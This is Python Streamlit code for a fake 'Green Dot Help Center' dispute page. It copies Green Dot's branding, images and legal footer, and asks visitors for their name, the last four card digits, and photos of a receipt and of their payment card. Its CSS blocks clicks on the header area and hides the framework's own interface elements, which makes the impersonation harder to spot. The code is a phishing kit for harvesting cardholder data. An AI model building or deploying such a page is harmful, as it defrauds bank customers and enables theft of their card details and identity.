
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- CSS DE BLOQUEO TOTAL ---
st.markdown("""<style>
/* 1. Capa Escudo: Bloquea clics en toda la franja superior (Logo y Título) */
.stApp::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 250px;
    z-index: 999999;
    pointer-events: all;
    background: transparent;
}

/* 2. Ocultar el icono de anclaje (#) de forma agresiva */
.section-anchor, 
a.section-anchor, 
[data-testid='stHeaderActionElements'], 
[data-testid='stHeader'], 
header, 
footer, 
.st-emotion-cache-15zrgzn {
    display: none !important;
    visibility: hidden !important;
    opacity: 0 !important;
}

/* 3. Desactivar interacciones en títulos */
h1, h2, h3, [data-testid='stMarkdownContainer'] a {
    pointer-events: none !important;
    cursor: default !important;
    text-decoration: none !important;
}

/* 4. Estética General */
.stApp {
    background-color: #000000 !important;
    color: #FFFFFF !important;
}

.block-container {
    padding-top: 1rem !important;
}

.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    width: 100%;
    padding: 15px !important;
    font-weight: bold !important;
}
</style>""", unsafe_allow_html=True)

if os.path.exists('logo.svg'):
    st.image('logo.svg', width=250)

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("dispute_form", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Last 4 digits of Card")
    monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
    st.markdown("**Upload Evidence**")
    rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT NOW")

if submitted:
    if nombre and rec and car:
        st.success("✅ Claim received.")

st.markdown("""<div style='background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0;'>
    <h2 style='color:white;'>Download the Green Dot app</h2>
    <div style='display: flex; justify-content: center; gap: 20px; margin-top: 20px;'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
    </div>
</div>""", unsafe_allow_html=True)

st.markdown("""<div style='font-size: 11px; color: #666; text-align: justify; margin-top: 60px; border-top: 1px solid #222; padding-top: 20px;'>
    Green Dot® cards are issued by Green Dot Bank, Member FDIC.<br>
    ©2026 Green Dot Corporation. All rights reserved.
</div>""", unsafe_allow_html=True)
